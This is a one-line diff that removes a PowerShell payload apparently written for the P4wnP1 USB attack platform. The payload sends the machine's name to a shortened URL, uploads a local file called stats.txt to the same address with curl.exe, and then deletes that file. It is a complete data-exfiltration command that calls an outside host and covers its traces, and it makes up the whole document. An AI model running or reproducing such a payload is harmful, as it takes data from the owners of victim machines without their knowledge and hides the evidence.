@@ -1,1 +1,0 @@
-﻿$url="bit.ly/whitehad";$Body=@{ content = "$env:computername Stats from P4wnP1"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt';
